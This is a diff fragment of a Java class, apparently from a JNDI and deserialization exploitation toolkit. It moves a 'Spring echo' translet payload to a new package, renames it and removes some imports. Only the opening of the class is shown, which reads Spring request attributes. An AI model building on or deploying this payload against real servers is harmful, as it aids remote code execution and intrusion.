@@ -1,22 +1,14 @@
-package com.qi4l.jndi.template;
+package com.qi4l.jndi.template.echo;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-import org.apache.catalina.core.ApplicationFilterChain;
 
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import java.lang.reflect.Field;
-import java.lang.reflect.Modifier;
+public class SpringEcho extends AbstractTranslet {
 
-public class SpringEchoTemplate extends AbstractTranslet {
-
-    public SpringEchoTemplate() {
+    public SpringEcho() {
 
         try {
             org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
